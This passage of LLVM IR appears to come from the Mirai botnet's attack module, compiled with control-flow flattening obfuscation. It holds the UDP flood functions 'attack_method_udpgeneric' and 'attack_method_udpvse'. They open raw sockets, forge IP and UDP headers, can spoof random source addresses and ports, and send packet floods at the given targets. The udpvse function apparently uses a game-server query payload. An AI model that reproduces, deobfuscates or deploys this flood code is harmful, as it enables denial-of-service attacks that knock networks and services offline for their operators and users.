  store i32 1890303233, i32* %switchVar
  br label %loopEnd

; <label>:625:                                    ; preds = %loopEntry
  store i32 -899725029, i32* %switchVar
  br label %loopEnd

; <label>:626:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %625, %622, %550, %547, %543, %537, %519, %513, %512, %511, %508, %507, %506, %503, %497, %496, %495, %494, %491, %482, %473, %351, %347, %255, %246, %237, %224, %219, %210, %209, %197, %189, %185, %180, %175, %166, %145, %129, %128, %124, %123, %117, %116, %113, %107, %106, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpgeneric(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i32, align 4
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.udphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %28 = load i8, i8* %5, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 %29, i64 8) #6
  %31 = bitcast i8* %30 to i8**
  store i8** %31, i8*** %11, align 8
  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 zeroext %32, %struct.attack_option* %33, i8 zeroext 2, i32 0)
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %12, align 1
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i32 @attack_get_opt_int(i8 zeroext %36, %struct.attack_option* %37, i8 zeroext 3, i32 65535)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %13, align 2
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 4, i32 64)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 5, i32 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = load i8, i8* %7, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 6, i32 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %16, align 2
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 7, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %17, align 2
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 0, i32 512)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 1, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %19, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = load i32, i32* @LOCAL_ADDR, align 4
  %67 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 25, i32 %66)
  store i32 %67, i32* %20, align 4
  %68 = load i16, i16* %18, align 2
  %69 = zext i16 %68 to i32
  store i32 %69, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -2053445256, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -2053445256, label %first
    i32 438287368, label %72
    i32 -1912275068, label %73
    i32 -507002327, label %77
    i32 1342222844, label %78
    i32 1508982000, label %84
    i32 156964981, label %87
    i32 919763919, label %88
    i32 -1205298758, label %94
    i32 -82049263, label %139
    i32 -296689319, label %143
    i32 2048286845, label %172
    i32 -607669712, label %175
    i32 -53167994, label %176
    i32 1297079788, label %177
    i32 1359821845, label %183
    i32 -1130647251, label %206
    i32 1167883115, label %227
    i32 -2025758355, label %231
    i32 -1043781432, label %235
    i32 1903894308, label %240
    i32 1340186519, label %245
    i32 -1417688193, label %250
    i32 20029867, label %255
    i32 -1637911654, label %260
    i32 -453980272, label %265
    i32 -554332772, label %269
    i32 1209790063, label %273
    i32 -1011867669, label %320
    i32 1645224397, label %323
    i32 -1086036391, label %324
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %70 = icmp sgt i32 %.reload, 1460
  %71 = select i1 %70, i32 438287368, i32 -1912275068
  store i32 %71, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  store i16 1460, i16* %18, align 2
  store i32 -1912275068, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %74, i32* %10, align 4
  %75 = icmp eq i32 %74, -1
  %76 = select i1 %75, i32 -507002327, i32 1342222844
  store i32 %76, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  store i32 -1086036391, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %79 = load i32, i32* %10, align 4
  %80 = bitcast i32* %9 to i8*
  %81 = call i32 @setsockopt(i32 %79, i32 0, i32 3, i8* %80, i32 4) #6
  %82 = icmp eq i32 %81, -1
  %83 = select i1 %82, i32 1508982000, i32 156964981
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %10, align 4
  %86 = call i32 @close(i32 %85)
  store i32 -1086036391, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 919763919, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* %9, align 4
  %90 = load i8, i8* %5, align 1
  %91 = zext i8 %90 to i32
  %92 = icmp slt i32 %89, %91
  %93 = select i1 %92, i32 -1205298758, i32 -607669712
  store i32 %93, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %96 = load i8**, i8*** %11, align 8
  %97 = load i32, i32* %9, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds i8*, i8** %96, i64 %98
  store i8* %95, i8** %99, align 8
  %100 = load i8**, i8*** %11, align 8
  %101 = load i32, i32* %9, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i8*, i8** %100, i64 %102
  %104 = load i8*, i8** %103, align 8
  %105 = bitcast i8* %104 to %struct.iphdr*
  store %struct.iphdr* %105, %struct.iphdr** %21, align 8
  %106 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %107 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %106, i64 1
  %108 = bitcast %struct.iphdr* %107 to %struct.udphdr*
  store %struct.udphdr* %108, %struct.udphdr** %22, align 8
  %109 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %110 = bitcast %struct.iphdr* %109 to i8*
  %111 = load i8, i8* %110, align 4
  %112 = and i8 %111, 15
  %113 = or i8 %112, 64
  store i8 %113, i8* %110, align 4
  %114 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %115 = bitcast %struct.iphdr* %114 to i8*
  %116 = load i8, i8* %115, align 4
  %117 = and i8 %116, -16
  %118 = or i8 %117, 5
  store i8 %118, i8* %115, align 4
  %119 = load i8, i8* %12, align 1
  %120 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %121 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %120, i32 0, i32 1
  store i8 %119, i8* %121, align 1
  %122 = load i16, i16* %18, align 2
  %123 = zext i16 %122 to i64
  %124 = add i64 28, %123
  %125 = trunc i64 %124 to i16
  %126 = call zeroext i16 @htons(i16 zeroext %125) #7
  %127 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %128 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %127, i32 0, i32 2
  store i16 %126, i16* %128, align 2
  %129 = load i16, i16* %13, align 2
  %130 = call zeroext i16 @htons(i16 zeroext %129) #7
  %131 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %132 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %131, i32 0, i32 3
  store i16 %130, i16* %132, align 4
  %133 = load i8, i8* %14, align 1
  %134 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %135 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %134, i32 0, i32 5
  store i8 %133, i8* %135, align 4
  %136 = load i8, i8* %15, align 1
  %137 = icmp ne i8 %136, 0
  %138 = select i1 %137, i32 -82049263, i32 -296689319
  store i32 %138, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %141 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %142 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %141, i32 0, i32 4
  store i16 %140, i16* %142, align 2
  store i32 -296689319, i32* %switchVar
  br label %loopEnd

; <label>:143:                                    ; preds = %loopEntry
  %144 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %145 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %144, i32 0, i32 6
  store i8 17, i8* %145, align 1
  %146 = load i32, i32* %20, align 4
  %147 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %148 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %147, i32 0, i32 8
  store i32 %146, i32* %148, align 4
  %149 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %150 = load i32, i32* %9, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %149, i64 %151
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i32 0, i32 1
  %154 = load i32, i32* %153, align 4
  %155 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 9
  store i32 %154, i32* %156, align 4
  %157 = load i16, i16* %16, align 2
  %158 = call zeroext i16 @htons(i16 zeroext %157) #7
  %159 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %160 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %159, i32 0, i32 0
  store i16 %158, i16* %160, align 2
  %161 = load i16, i16* %17, align 2
  %162 = call zeroext i16 @htons(i16 zeroext %161) #7
  %163 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %164 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %163, i32 0, i32 1
  store i16 %162, i16* %164, align 2
  %165 = load i16, i16* %18, align 2
  %166 = zext i16 %165 to i64
  %167 = add i64 8, %166
  %168 = trunc i64 %167 to i16
  %169 = call zeroext i16 @htons(i16 zeroext %168) #7
  %170 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %171 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %170, i32 0, i32 2
  store i16 %169, i16* %171, align 2
  store i32 2048286845, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  %173 = load i32, i32* %9, align 4
  %174 = add nsw i32 %173, 1
  store i32 %174, i32* %9, align 4
  store i32 919763919, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  store i32 -53167994, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1297079788, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = load i32, i32* %9, align 4
  %179 = load i8, i8* %5, align 1
  %180 = zext i8 %179 to i32
  %181 = icmp slt i32 %178, %180
  %182 = select i1 %181, i32 1359821845, i32 1645224397
  store i32 %182, i32* %switchVar
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  %184 = load i8**, i8*** %11, align 8
  %185 = load i32, i32* %9, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds i8*, i8** %184, i64 %186
  %188 = load i8*, i8** %187, align 8
  store i8* %188, i8** %23, align 8
  %189 = load i8*, i8** %23, align 8
  %190 = bitcast i8* %189 to %struct.iphdr*
  store %struct.iphdr* %190, %struct.iphdr** %24, align 8
  %191 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i64 1
  %193 = bitcast %struct.iphdr* %192 to %struct.udphdr*
  store %struct.udphdr* %193, %struct.udphdr** %25, align 8
  %194 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %195 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %194, i64 1
  %196 = bitcast %struct.udphdr* %195 to i8*
  store i8* %196, i8** %26, align 8
  %197 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %198 = load i32, i32* %9, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %197, i64 %199
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %200, i32 0, i32 2
  %202 = load i8, i8* %201, align 4
  %203 = zext i8 %202 to i32
  %204 = icmp slt i32 %203, 32
  %205 = select i1 %204, i32 -1130647251, i32 1167883115
  store i32 %205, i32* %switchVar
  br label %loopEnd

; <label>:206:                                    ; preds = %loopEntry
  %207 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %208 = load i32, i32* %9, align 4
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %207, i64 %209
  %211 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %210, i32 0, i32 1
  %212 = load i32, i32* %211, align 4
  %213 = call i32 @ntohl(i32 %212) #7
  %214 = call i32 @rand_next()
  %215 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %216 = load i32, i32* %9, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %215, i64 %217
  %219 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %218, i32 0, i32 2
  %220 = load i8, i8* %219, align 4
  %221 = zext i8 %220 to i32
  %222 = lshr i32 %214, %221
  %223 = add i32 %213, %222
  %224 = call i32 @htonl(i32 %223) #7
  %225 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %226 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %225, i32 0, i32 9
  store i32 %224, i32* %226, align 4
  store i32 1167883115, i32* %switchVar
  br label %loopEnd

; <label>:227:                                    ; preds = %loopEntry
  %228 = load i32, i32* %20, align 4
  %229 = icmp eq i32 %228, -1
  %230 = select i1 %229, i32 -2025758355, i32 -1043781432
  store i32 %230, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  %232 = call i32 @rand_next()
  %233 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %234 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %233, i32 0, i32 8
  store i32 %232, i32* %234, align 4
  store i32 -1043781432, i32* %switchVar
  br label %loopEnd

; <label>:235:                                    ; preds = %loopEntry
  %236 = load i16, i16* %13, align 2
  %237 = zext i16 %236 to i32
  %238 = icmp eq i32 %237, 65535
  %239 = select i1 %238, i32 1903894308, i32 1340186519
  store i32 %239, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  %241 = call i32 @rand_next()
  %242 = trunc i32 %241 to i16
  %243 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %244 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %243, i32 0, i32 3
  store i16 %242, i16* %244, align 4
  store i32 1340186519, i32* %switchVar
  br label %loopEnd

; <label>:245:                                    ; preds = %loopEntry
  %246 = load i16, i16* %16, align 2
  %247 = zext i16 %246 to i32
  %248 = icmp eq i32 %247, 65535
  %249 = select i1 %248, i32 -1417688193, i32 20029867
  store i32 %249, i32* %switchVar
  br label %loopEnd

; <label>:250:                                    ; preds = %loopEntry
  %251 = call i32 @rand_next()
  %252 = trunc i32 %251 to i16
  %253 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %254 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %253, i32 0, i32 0
  store i16 %252, i16* %254, align 2
  store i32 20029867, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = load i16, i16* %17, align 2
  %257 = zext i16 %256 to i32
  %258 = icmp eq i32 %257, 65535
  %259 = select i1 %258, i32 -1637911654, i32 -453980272
  store i32 %259, i32* %switchVar
  br label %loopEnd

; <label>:260:                                    ; preds = %loopEntry
  %261 = call i32 @rand_next()
  %262 = trunc i32 %261 to i16
  %263 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %264 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %263, i32 0, i32 1
  store i16 %262, i16* %264, align 2
  store i32 -453980272, i32* %switchVar
  br label %loopEnd

; <label>:265:                                    ; preds = %loopEntry
  %266 = load i8, i8* %19, align 1
  %267 = icmp ne i8 %266, 0
  %268 = select i1 %267, i32 -554332772, i32 1209790063
  store i32 %268, i32* %switchVar
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %270 = load i8*, i8** %26, align 8
  %271 = load i16, i16* %18, align 2
  %272 = zext i16 %271 to i32
  call void @rand_str(i8* %270, i32 %272)
  store i32 1209790063, i32* %switchVar
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  %274 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 7
  store i16 0, i16* %275, align 2
  %276 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %277 = bitcast %struct.iphdr* %276 to i16*
  %278 = call zeroext i16 @checksum_generic(i16* %277, i32 20)
  %279 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i32 0, i32 7
  store i16 %278, i16* %280, align 2
  %281 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %282 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %281, i32 0, i32 3
  store i16 0, i16* %282, align 2
  %283 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %284 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %285 = bitcast %struct.udphdr* %284 to i8*
  %286 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %287 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %286, i32 0, i32 2
  %288 = load i16, i16* %287, align 2
  %289 = load i16, i16* %18, align 2
  %290 = zext i16 %289 to i64
  %291 = add i64 8, %290
  %292 = trunc i64 %291 to i32
  %293 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %283, i8* %285, i16 zeroext %288, i32 %292)
  %294 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %295 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %294, i32 0, i32 3
  store i16 %293, i16* %295, align 2
  %296 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %297 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %296, i32 0, i32 1
  %298 = load i16, i16* %297, align 2
  %299 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %300 = load i32, i32* %9, align 4
  %301 = sext i32 %300 to i64
  %302 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %299, i64 %301
  %303 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %302, i32 0, i32 0
  %304 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %303, i32 0, i32 1
  store i16 %298, i16* %304, align 2
  %305 = load i32, i32* %10, align 4
  %306 = load i8*, i8** %23, align 8
  %307 = load i16, i16* %18, align 2
  %308 = zext i16 %307 to i64
  %309 = add i64 28, %308
  %310 = bitcast %union.__CONST_SOCKADDR_ARG* %27 to %struct.sockaddr**
  %311 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %312 = load i32, i32* %9, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %311, i64 %313
  %315 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %314, i32 0, i32 0
  %316 = bitcast %struct.sockaddr_in* %315 to %struct.sockaddr*
  store %struct.sockaddr* %316, %struct.sockaddr** %310, align 8
  %317 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %27, i32 0, i32 0
  %318 = load %struct.sockaddr*, %struct.sockaddr** %317, align 8
  %319 = call i64 @sendto(i32 %305, i8* %306, i64 %309, i32 16384, %struct.sockaddr* %318, i32 16)
  store i32 -1011867669, i32* %switchVar
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  %321 = load i32, i32* %9, align 4
  %322 = add nsw i32 %321, 1
  store i32 %322, i32* %9, align 4
  store i32 1297079788, i32* %switchVar
  br label %loopEnd

; <label>:323:                                    ; preds = %loopEntry
  store i32 -53167994, i32* %switchVar
  br label %loopEnd

; <label>:324:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %323, %320, %273, %269, %265, %260, %255, %250, %245, %240, %235, %231, %227, %206, %183, %177, %176, %175, %172, %143, %139, %94, %88, %87, %84, %78, %77, %73, %72, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpvse(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 8) #6
  %30 = bitcast i8* %29 to i8**
  store i8** %30, i8*** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 2, i32 0)
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* %12, align 1
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 3, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 4, i32 64)
  %42 = trunc i32 %41 to i8
  store i8 %42, i8* %14, align 1
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 5, i32 0)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = load i8, i8* %7, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 6, i32 65535)
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %16, align 2
  %51 = load i8, i8* %7, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 7, i32 27015)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %17, align 2
  call void @table_unlock_val(i8 zeroext 20)
  %55 = call i8* @table_retrieve_val(i32 20, i32* %19)
  store i8* %55, i8** %18, align 8
  %56 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %56, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 811031089, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 811031089, label %first
    i32 -1091365199, label %59
    i32 -603622059, label %60
    i32 -1329000035, label %66
    i32 -1387761775, label %69
    i32 -1972426222, label %70
    i32 981390671, label %76
    i32 93738578, label %124
    i32 -690569843, label %128
    i32 -810342527, label %164
    i32 -2047009737, label %167
    i32 1009100238, label %168
    i32 93827538, label %169
    i32 -1965633192, label %175
    i32 -237635156, label %195
    i32 1270743707, label %216
    i32 -1765818016, label %221
    i32 -1628654431, label %226
    i32 211372649, label %231
    i32 -990078033, label %236
    i32 -1003274590, label %241
    i32 1655637810, label %246
    i32 -874822905, label %293
    i32 -1164495266, label %296
    i32 459977601, label %297
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %57 = icmp eq i32 %.reload, -1
  %58 = select i1 %57, i32 -1091365199, i32 -603622059
  store i32 %58, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  store i32 459977601, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %61 = load i32, i32* %10, align 4
  %62 = bitcast i32* %9 to i8*
  %63 = call i32 @setsockopt(i32 %61, i32 0, i32 3, i8* %62, i32 4) #6
  %64 = icmp eq i32 %63, -1
  %65 = select i1 %64, i32 -1329000035, i32 -1387761775
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %10, align 4
  %68 = call i32 @close(i32 %67)
  store i32 459977601, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1972426222, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i32, i32* %9, align 4
  %72 = load i8, i8* %5, align 1
  %73 = zext i8 %72 to i32
  %74 = icmp slt i32 %71, %73
  %75 = select i1 %74, i32 981390671, i32 -2047009737
  store i32 %75, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = call noalias i8* @calloc(i64 128, i64 1) #6
  %78 = load i8**, i8*** %11, align 8
  %79 = load i32, i32* %9, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8*, i8** %78, i64 %80
  store i8* %77, i8** %81, align 8
  %82 = load i8**, i8*** %11, align 8
  %83 = load i32, i32* %9, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds i8*, i8** %82, i64 %84
  %86 = load i8*, i8** %85, align 8
  %87 = bitcast i8* %86 to %struct.iphdr*
  store %struct.iphdr* %87, %struct.iphdr** %20, align 8
  %88 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %89 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %88, i64 1
  %90 = bitcast %struct.iphdr* %89 to %struct.udphdr*
  store %struct.udphdr* %90, %struct.udphdr** %21, align 8
  %91 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %92 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %91, i64 1
  %93 = bitcast %struct.udphdr* %92 to i8*
  store i8* %93, i8** %22, align 8
  %94 = load %struct.iphdr*, %struct.iphdr** %20, align 8
